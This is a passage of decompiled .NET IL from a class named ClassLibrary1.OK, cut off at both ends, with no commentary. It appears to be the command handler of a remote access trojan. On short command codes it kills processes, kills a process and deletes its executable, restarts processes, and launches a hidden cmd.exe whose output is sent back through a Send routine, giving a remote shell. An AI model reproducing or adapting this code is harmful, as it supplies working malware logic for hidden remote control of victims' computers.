        IL_02e9:  stelem.ref
        IL_02ea:  ldloc.s    V_60
        IL_02ec:  ldc.i4.5
        IL_02ed:  ldstr      ","
        IL_02f2:  stelem.ref
        IL_02f3:  ldloc.s    V_60
        IL_02f5:  ldc.i4.6
        IL_02f6:  ldloc.s    V_9
        IL_02f8:  stelem.ref
        IL_02f9:  ldloc.s    V_60
        IL_02fb:  call       string [mscorlib]System.String::Concat(string[])
        IL_0300:  stloc.3
        IL_0301:  br.s       IL_0354

        IL_0303:  ldc.i4.7
        IL_0304:  newarr     [mscorlib]System.String
        IL_0309:  stloc.s    V_60
        IL_030b:  ldloc.s    V_60
        IL_030d:  ldc.i4.0
        IL_030e:  ldloc.3
        IL_030f:  stelem.ref
        IL_0310:  ldloc.s    V_60
        IL_0312:  ldc.i4.1
        IL_0313:  ldsfld     string ClassLibrary1.OK::Y
        IL_0318:  stelem.ref
        IL_0319:  ldloc.s    V_60
        IL_031b:  ldc.i4.2
        IL_031c:  ldloc.s    V_4
        IL_031e:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
        IL_0323:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_0328:  stelem.ref
        IL_0329:  ldloc.s    V_60
        IL_032b:  ldc.i4.3
        IL_032c:  ldstr      ","
        IL_0331:  stelem.ref
        IL_0332:  ldloc.s    V_60
        IL_0334:  ldc.i4.4
        IL_0335:  ldloc.s    V_4
        IL_0337:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
        IL_033c:  stelem.ref
        IL_033d:  ldloc.s    V_60
        IL_033f:  ldc.i4.5
        IL_0340:  ldstr      ","
        IL_0345:  stelem.ref
        IL_0346:  ldloc.s    V_60
        IL_0348:  ldc.i4.6
        IL_0349:  ldloc.s    V_9
        IL_034b:  stelem.ref
        IL_034c:  ldloc.s    V_60
        IL_034e:  call       string [mscorlib]System.String::Concat(string[])
        IL_0353:  stloc.3
        IL_0354:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0359:  leave.s    IL_035b

      }  // end handler
      IL_035b:  ldloc.1
      IL_035c:  ldc.i4.s   10
      IL_035e:  bne.un.s   IL_0398

      IL_0360:  ldc.i4.0
      IL_0361:  stloc.1
      IL_0362:  ldnull
      IL_0363:  ldftn      void ClassLibrary1.OK::_Lambda$__1(object)
      IL_0369:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_036e:  ldc.i4.1
      IL_036f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0374:  stloc.s    V_12
      IL_0376:  ldloc.s    V_12
      IL_0378:  ldstr      "proc"
      IL_037d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0382:  ldstr      "!"
      IL_0387:  ldloc.3
      IL_0388:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_038d:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0392:  ldstr      ""
      IL_0397:  stloc.3
      IL_0398:  ldloc.s    V_61
      IL_039a:  ldc.i4.1
      IL_039b:  add.ovf
      IL_039c:  stloc.s    V_61
      IL_039e:  ldloc.s    V_61
      IL_03a0:  ldloc.s    V_62
      IL_03a2:  ldlen
      IL_03a3:  conv.ovf.i4
      IL_03a4:  blt        IL_00ee

      IL_03a9:  ldloc.3
      IL_03aa:  ldstr      ""
      IL_03af:  ldc.i4.0
      IL_03b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03b5:  ldc.i4.0
      IL_03b6:  beq        IL_07e0

      IL_03bb:  ldstr      "proc"
      IL_03c0:  ldsfld     string ClassLibrary1.OK::Y
      IL_03c5:  ldstr      "!"
      IL_03ca:  ldloc.3
      IL_03cb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_03d0:  call       bool ClassLibrary1.OK::Send(string)
      IL_03d5:  pop
      IL_03d6:  leave      IL_16cc

      IL_03db:  ldloc.s    V_59
      IL_03dd:  ldstr      "k"
      IL_03e2:  ldc.i4.0
      IL_03e3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03e8:  ldc.i4.0
      IL_03e9:  bne.un     IL_04ba

      IL_03ee:  ldc.i4.2
      IL_03ef:  ldloc.0
      IL_03f0:  ldlen
      IL_03f1:  conv.ovf.i4
      IL_03f2:  ldc.i4.1
      IL_03f3:  sub.ovf
      IL_03f4:  stloc.s    V_64
      IL_03f6:  stloc.s    V_13
      IL_03f8:  br         IL_04ac

      .try
      {
        IL_03fd:  ldloc.0
        IL_03fe:  ldloc.s    V_13
        IL_0400:  ldelem.ref
        IL_0401:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0406:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_040b:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0410:  ldc.i4.5
        IL_0411:  newarr     [mscorlib]System.String
        IL_0416:  stloc.s    V_60
        IL_0418:  ldloc.s    V_60
        IL_041a:  ldc.i4.0
        IL_041b:  ldstr      "proc"
        IL_0420:  stelem.ref
        IL_0421:  ldloc.s    V_60
        IL_0423:  ldc.i4.1
        IL_0424:  ldsfld     string ClassLibrary1.OK::Y
        IL_0429:  stelem.ref
        IL_042a:  ldloc.s    V_60
        IL_042c:  ldc.i4.2
        IL_042d:  ldstr      "RM"
        IL_0432:  stelem.ref
        IL_0433:  ldloc.s    V_60
        IL_0435:  ldc.i4.3
        IL_0436:  ldsfld     string ClassLibrary1.OK::Y
        IL_043b:  stelem.ref
        IL_043c:  ldloc.s    V_60
        IL_043e:  ldc.i4.4
        IL_043f:  ldloc.0
        IL_0440:  ldloc.s    V_13
        IL_0442:  ldelem.ref
        IL_0443:  stelem.ref
        IL_0444:  ldloc.s    V_60
        IL_0446:  call       string [mscorlib]System.String::Concat(string[])
        IL_044b:  call       bool ClassLibrary1.OK::Send(string)
        IL_0450:  pop
        IL_0451:  leave.s    IL_04a6

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0453:  dup
        IL_0454:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0459:  stloc.s    V_14
        IL_045b:  ldc.i4.5
        IL_045c:  newarr     [mscorlib]System.String
        IL_0461:  stloc.s    V_60
        IL_0463:  ldloc.s    V_60
        IL_0465:  ldc.i4.0
        IL_0466:  ldstr      "proc"
        IL_046b:  stelem.ref
        IL_046c:  ldloc.s    V_60
        IL_046e:  ldc.i4.1
        IL_046f:  ldsfld     string ClassLibrary1.OK::Y
        IL_0474:  stelem.ref
        IL_0475:  ldloc.s    V_60
        IL_0477:  ldc.i4.2
        IL_0478:  ldstr      "ER"
        IL_047d:  stelem.ref
        IL_047e:  ldloc.s    V_60
        IL_0480:  ldc.i4.3
        IL_0481:  ldsfld     string ClassLibrary1.OK::Y
        IL_0486:  stelem.ref
        IL_0487:  ldloc.s    V_60
        IL_0489:  ldc.i4.4
        IL_048a:  ldloc.s    V_14
        IL_048c:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0491:  stelem.ref
        IL_0492:  ldloc.s    V_60
        IL_0494:  call       string [mscorlib]System.String::Concat(string[])
        IL_0499:  call       bool ClassLibrary1.OK::Send(string)
        IL_049e:  pop
        IL_049f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_04a4:  leave.s    IL_04a6

      }  // end handler
      IL_04a6:  ldloc.s    V_13
      IL_04a8:  ldc.i4.1
      IL_04a9:  add.ovf
      IL_04aa:  stloc.s    V_13
      IL_04ac:  ldloc.s    V_13
      IL_04ae:  ldloc.s    V_64
      IL_04b0:  ble        IL_03fd

      IL_04b5:  leave      IL_16cc

      IL_04ba:  ldloc.s    V_59
      IL_04bc:  ldstr      "kd"
      IL_04c1:  ldc.i4.0
      IL_04c2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04c7:  ldc.i4.0
      IL_04c8:  bne.un     IL_0643

      IL_04cd:  ldc.i4.2
      IL_04ce:  ldloc.0
      IL_04cf:  ldlen
      IL_04d0:  conv.ovf.i4
      IL_04d1:  ldc.i4.1
      IL_04d2:  sub.ovf
      IL_04d3:  stloc.s    V_65
      IL_04d5:  stloc.s    V_15
      IL_04d7:  br         IL_0635

      .try
      {
        IL_04dc:  ldstr      ""
        IL_04e1:  stloc.s    V_16
        IL_04e3:  ldloc.0
        IL_04e4:  ldloc.s    V_15
        IL_04e6:  ldelem.ref
        IL_04e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_04ec:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_04f1:  stloc.s    V_66
        .try
        {
          IL_04f3:  ldloc.s    V_66
          IL_04f5:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_04fa:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_04ff:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_0504:  stloc.s    V_16
          IL_0506:  leave.s    IL_0536

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0508:  dup
          IL_0509:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_050e:  stloc.s    V_17
          .try
          {
            IL_0510:  ldloc.s    V_66
            IL_0512:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_0517:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
            IL_051c:  stloc.s    V_16
            IL_051e:  leave.s    IL_052f

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_0520:  dup
            IL_0521:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0526:  stloc.s    V_18
            IL_0528:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_052d:  leave.s    IL_052f

          }  // end handler
          IL_052f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0534:  leave.s    IL_0536

        }  // end handler
        IL_0536:  ldloc.s    V_66
        IL_0538:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_053d:  ldc.i4.5
        IL_053e:  newarr     [mscorlib]System.String
        IL_0543:  stloc.s    V_60
        IL_0545:  ldloc.s    V_60
        IL_0547:  ldc.i4.0
        IL_0548:  ldstr      "proc"
        IL_054d:  stelem.ref
        IL_054e:  ldloc.s    V_60
        IL_0550:  ldc.i4.1
        IL_0551:  ldsfld     string ClassLibrary1.OK::Y
        IL_0556:  stelem.ref
        IL_0557:  ldloc.s    V_60
        IL_0559:  ldc.i4.2
        IL_055a:  ldstr      "RM"
        IL_055f:  stelem.ref
        IL_0560:  ldloc.s    V_60
        IL_0562:  ldc.i4.3
        IL_0563:  ldsfld     string ClassLibrary1.OK::Y
        IL_0568:  stelem.ref
        IL_0569:  ldloc.s    V_60
        IL_056b:  ldc.i4.4
        IL_056c:  ldloc.0
        IL_056d:  ldloc.s    V_15
        IL_056f:  ldelem.ref
        IL_0570:  stelem.ref
        IL_0571:  ldloc.s    V_60
        IL_0573:  call       string [mscorlib]System.String::Concat(string[])
        IL_0578:  call       bool ClassLibrary1.OK::Send(string)
        IL_057d:  pop
        IL_057e:  ldnull
        IL_057f:  stloc.s    V_66
        IL_0581:  ldc.i4     0x7d0
        IL_0586:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_058b:  ldloc.s    V_16
        IL_058d:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0592:  ldc.i4.6
        IL_0593:  newarr     [mscorlib]System.String
        IL_0598:  stloc.s    V_60
        IL_059a:  ldloc.s    V_60
        IL_059c:  ldc.i4.0
        IL_059d:  ldstr      "proc"
        IL_05a2:  stelem.ref
        IL_05a3:  ldloc.s    V_60
        IL_05a5:  ldc.i4.1
        IL_05a6:  ldsfld     string ClassLibrary1.OK::Y
        IL_05ab:  stelem.ref
        IL_05ac:  ldloc.s    V_60
        IL_05ae:  ldc.i4.2
        IL_05af:  ldstr      "ER"
        IL_05b4:  stelem.ref
        IL_05b5:  ldloc.s    V_60
        IL_05b7:  ldc.i4.3
        IL_05b8:  ldsfld     string ClassLibrary1.OK::Y
        IL_05bd:  stelem.ref
        IL_05be:  ldloc.s    V_60
        IL_05c0:  ldc.i4.4
        IL_05c1:  ldstr      "Deleted "
        IL_05c6:  stelem.ref
        IL_05c7:  ldloc.s    V_60
        IL_05c9:  ldc.i4.5
        IL_05ca:  ldloc.s    V_16
        IL_05cc:  stelem.ref
        IL_05cd:  ldloc.s    V_60
        IL_05cf:  call       string [mscorlib]System.String::Concat(string[])
        IL_05d4:  call       bool ClassLibrary1.OK::Send(string)
        IL_05d9:  pop
        IL_05da:  leave.s    IL_062f

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_05dc:  dup
        IL_05dd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_05e2:  stloc.s    V_19
        IL_05e4:  ldc.i4.5
        IL_05e5:  newarr     [mscorlib]System.String
        IL_05ea:  stloc.s    V_60
        IL_05ec:  ldloc.s    V_60
        IL_05ee:  ldc.i4.0
        IL_05ef:  ldstr      "proc"
        IL_05f4:  stelem.ref
        IL_05f5:  ldloc.s    V_60
        IL_05f7:  ldc.i4.1
        IL_05f8:  ldsfld     string ClassLibrary1.OK::Y
        IL_05fd:  stelem.ref
        IL_05fe:  ldloc.s    V_60
        IL_0600:  ldc.i4.2
        IL_0601:  ldstr      "ER"
        IL_0606:  stelem.ref
        IL_0607:  ldloc.s    V_60
        IL_0609:  ldc.i4.3
        IL_060a:  ldsfld     string ClassLibrary1.OK::Y
        IL_060f:  stelem.ref
        IL_0610:  ldloc.s    V_60
        IL_0612:  ldc.i4.4
        IL_0613:  ldloc.s    V_19
        IL_0615:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_061a:  stelem.ref
        IL_061b:  ldloc.s    V_60
        IL_061d:  call       string [mscorlib]System.String::Concat(string[])
        IL_0622:  call       bool ClassLibrary1.OK::Send(string)
        IL_0627:  pop
        IL_0628:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_062d:  leave.s    IL_062f

      }  // end handler
      IL_062f:  ldloc.s    V_15
      IL_0631:  ldc.i4.1
      IL_0632:  add.ovf
      IL_0633:  stloc.s    V_15
      IL_0635:  ldloc.s    V_15
      IL_0637:  ldloc.s    V_65
      IL_0639:  ble        IL_04dc

      IL_063e:  leave      IL_16cc

      IL_0643:  ldloc.s    V_59
      IL_0645:  ldstr      "re"
      IL_064a:  ldc.i4.0
      IL_064b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0650:  ldc.i4.0
      IL_0651:  bne.un     IL_1668

      IL_0656:  ldc.i4.2
      IL_0657:  ldloc.0
      IL_0658:  ldlen
      IL_0659:  conv.ovf.i4
      IL_065a:  ldc.i4.1
      IL_065b:  sub.ovf
      IL_065c:  stloc.s    V_67
      IL_065e:  stloc.s    V_20
      IL_0660:  br         IL_07d7

      .try
      {
        IL_0665:  ldstr      ""
        IL_066a:  stloc.s    V_21
        IL_066c:  ldloc.0
        IL_066d:  ldloc.s    V_20
        IL_066f:  ldelem.ref
        IL_0670:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0675:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_067a:  stloc.s    V_68
        .try
        {
          IL_067c:  ldloc.s    V_68
          IL_067e:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_0683:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_0688:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_068d:  stloc.s    V_21
          IL_068f:  leave.s    IL_06e1

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0691:  dup
          IL_0692:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0697:  stloc.s    V_22
          .try
          {
            IL_0699:  ldloc.s    V_68
            IL_069b:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_06a0:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
            IL_06a5:  stloc.s    V_21
            IL_06a7:  leave.s    IL_06da

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_06a9:  dup
            IL_06aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_06af:  stloc.s    V_23
            IL_06b1:  ldstr      "windir"
            IL_06b6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
            IL_06bb:  ldstr      "\\system32\\"
            IL_06c0:  ldloc.s    V_68
            IL_06c2:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
            IL_06c7:  ldstr      ".exe"
            IL_06cc:  call       string [mscorlib]System.String::Concat(string,
                                                                        string,
                                                                        string,
                                                                        string)
            IL_06d1:  stloc.s    V_21
            IL_06d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_06d8:  leave.s    IL_06da

          }  // end handler
          IL_06da:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_06df:  leave.s    IL_06e1

        }  // end handler
        IL_06e1:  ldloc.s    V_68
        IL_06e3:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_06e8:  ldc.i4.5
        IL_06e9:  newarr     [mscorlib]System.String
        IL_06ee:  stloc.s    V_60
        IL_06f0:  ldloc.s    V_60
        IL_06f2:  ldc.i4.0
        IL_06f3:  ldstr      "proc"
        IL_06f8:  stelem.ref
        IL_06f9:  ldloc.s    V_60
        IL_06fb:  ldc.i4.1
        IL_06fc:  ldsfld     string ClassLibrary1.OK::Y
        IL_0701:  stelem.ref
        IL_0702:  ldloc.s    V_60
        IL_0704:  ldc.i4.2
        IL_0705:  ldstr      "RM"
        IL_070a:  stelem.ref
        IL_070b:  ldloc.s    V_60
        IL_070d:  ldc.i4.3
        IL_070e:  ldsfld     string ClassLibrary1.OK::Y
        IL_0713:  stelem.ref
        IL_0714:  ldloc.s    V_60
        IL_0716:  ldc.i4.4
        IL_0717:  ldloc.0
        IL_0718:  ldloc.s    V_20
        IL_071a:  ldelem.ref
        IL_071b:  stelem.ref
        IL_071c:  ldloc.s    V_60
        IL_071e:  call       string [mscorlib]System.String::Concat(string[])
        IL_0723:  call       bool ClassLibrary1.OK::Send(string)
        IL_0728:  pop
        IL_0729:  ldnull
        IL_072a:  stloc.s    V_68
        IL_072c:  ldloc.s    V_21
        IL_072e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0733:  pop
        IL_0734:  ldc.i4.6
        IL_0735:  newarr     [mscorlib]System.String
        IL_073a:  stloc.s    V_60
        IL_073c:  ldloc.s    V_60
        IL_073e:  ldc.i4.0
        IL_073f:  ldstr      "proc"
        IL_0744:  stelem.ref
        IL_0745:  ldloc.s    V_60
        IL_0747:  ldc.i4.1
        IL_0748:  ldsfld     string ClassLibrary1.OK::Y
        IL_074d:  stelem.ref
        IL_074e:  ldloc.s    V_60
        IL_0750:  ldc.i4.2
        IL_0751:  ldstr      "ER"
        IL_0756:  stelem.ref
        IL_0757:  ldloc.s    V_60
        IL_0759:  ldc.i4.3
        IL_075a:  ldsfld     string ClassLibrary1.OK::Y
        IL_075f:  stelem.ref
        IL_0760:  ldloc.s    V_60
        IL_0762:  ldc.i4.4
        IL_0763:  ldstr      "Started "
        IL_0768:  stelem.ref
        IL_0769:  ldloc.s    V_60
        IL_076b:  ldc.i4.5
        IL_076c:  ldloc.s    V_21
        IL_076e:  stelem.ref
        IL_076f:  ldloc.s    V_60
        IL_0771:  call       string [mscorlib]System.String::Concat(string[])
        IL_0776:  call       bool ClassLibrary1.OK::Send(string)
        IL_077b:  pop
        IL_077c:  leave.s    IL_07d1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_077e:  dup
        IL_077f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0784:  stloc.s    V_24
        IL_0786:  ldc.i4.5
        IL_0787:  newarr     [mscorlib]System.String
        IL_078c:  stloc.s    V_60
        IL_078e:  ldloc.s    V_60
        IL_0790:  ldc.i4.0
        IL_0791:  ldstr      "proc"
        IL_0796:  stelem.ref
        IL_0797:  ldloc.s    V_60
        IL_0799:  ldc.i4.1
        IL_079a:  ldsfld     string ClassLibrary1.OK::Y
        IL_079f:  stelem.ref
        IL_07a0:  ldloc.s    V_60
        IL_07a2:  ldc.i4.2
        IL_07a3:  ldstr      "ER"
        IL_07a8:  stelem.ref
        IL_07a9:  ldloc.s    V_60
        IL_07ab:  ldc.i4.3
        IL_07ac:  ldsfld     string ClassLibrary1.OK::Y
        IL_07b1:  stelem.ref
        IL_07b2:  ldloc.s    V_60
        IL_07b4:  ldc.i4.4
        IL_07b5:  ldloc.s    V_24
        IL_07b7:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_07bc:  stelem.ref
        IL_07bd:  ldloc.s    V_60
        IL_07bf:  call       string [mscorlib]System.String::Concat(string[])
        IL_07c4:  call       bool ClassLibrary1.OK::Send(string)
        IL_07c9:  pop
        IL_07ca:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_07cf:  leave.s    IL_07d1

      }  // end handler
      IL_07d1:  ldloc.s    V_20
      IL_07d3:  ldc.i4.1
      IL_07d4:  add.ovf
      IL_07d5:  stloc.s    V_20
      IL_07d7:  ldloc.s    V_20
      IL_07d9:  ldloc.s    V_67
      IL_07db:  ble        IL_0665

      IL_07e0:  leave      IL_16cc

      IL_07e5:  ldloc.s    V_58
      IL_07e7:  ldstr      "rss"
      IL_07ec:  ldc.i4.0
      IL_07ed:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07f2:  ldc.i4.0
      IL_07f3:  bne.un     IL_090d

      .try
      {
        IL_07f8:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
        IL_07fd:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0802:  leave.s    IL_0813

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0804:  dup
        IL_0805:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_080a:  stloc.s    V_25
        IL_080c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0811:  leave.s    IL_0813

      }  // end handler
      IL_0813:  newobj     instance void [System]System.Diagnostics.Process::.ctor()
      IL_0818:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_081d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0822:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0827:  ldc.i4.1
      IL_0828:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardOutput(bool)
      IL_082d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0832:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0837:  ldc.i4.1
      IL_0838:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardInput(bool)
      IL_083d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0842:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0847:  ldc.i4.1
      IL_0848:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardError(bool)
      IL_084d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0852:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0857:  ldstr      "cmd.exe"
      IL_085c:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0861:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0866:  ldnull
      IL_0867:  ldftn      void ClassLibrary1.OK::RS(object,
                                                     object)
      IL_086d:  newobj     instance void [System]System.Diagnostics.DataReceivedEventHandler::.ctor(object,
                                                                                                    native int)
      IL_0872:  callvirt   instance void [System]System.Diagnostics.Process::add_OutputDataReceived(class [System]System.Diagnostics.DataReceivedEventHandler)
      IL_0877:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_087c:  ldnull
      IL_087d:  ldftn      void ClassLibrary1.OK::RS(object,
                                                     object)
      IL_0883:  newobj     instance void [System]System.Diagnostics.DataReceivedEventHandler::.ctor(object,
                                                                                                    native int)
      IL_0888:  callvirt   instance void [System]System.Diagnostics.Process::add_ErrorDataReceived(class [System]System.Diagnostics.DataReceivedEventHandler)
      IL_088d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0892:  ldnull
      IL_0893:  ldftn      void ClassLibrary1.OK::_Lambda$__2(object,
                                                              class [mscorlib]System.EventArgs)
      IL_0899:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                              native int)
      IL_089e:  callvirt   instance void [System]System.Diagnostics.Process::add_Exited(class [mscorlib]System.EventHandler)
      IL_08a3:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08a8:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_08ad:  ldc.i4.0
      IL_08ae:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
      IL_08b3:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08b8:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_08bd:  ldc.i4.1
      IL_08be:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
      IL_08c3:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08c8:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_08cd:  ldc.i4.1
      IL_08ce:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_08d3:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08d8:  ldc.i4.1
      IL_08d9:  callvirt   instance void [System]System.Diagnostics.Process::set_EnableRaisingEvents(bool)
      IL_08de:  ldstr      "rss"
      IL_08e3:  call       bool ClassLibrary1.OK::Send(string)
      IL_08e8:  pop
      IL_08e9:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08ee:  callvirt   instance bool [System]System.Diagnostics.Process::Start()
      IL_08f3:  pop
      IL_08f4:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_08f9:  callvirt   instance void [System]System.Diagnostics.Process::BeginErrorReadLine()
      IL_08fe:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0903:  callvirt   instance void [System]System.Diagnostics.Process::BeginOutputReadLine()
      IL_0908:  leave      IL_16cc

      IL_090d:  ldloc.s    V_58
      IL_090f:  ldstr      "rs"
      IL_0914:  ldc.i4.0
      IL_0915:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_091a:  ldc.i4.0
      IL_091b:  bne.un.s   IL_093d

      IL_091d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
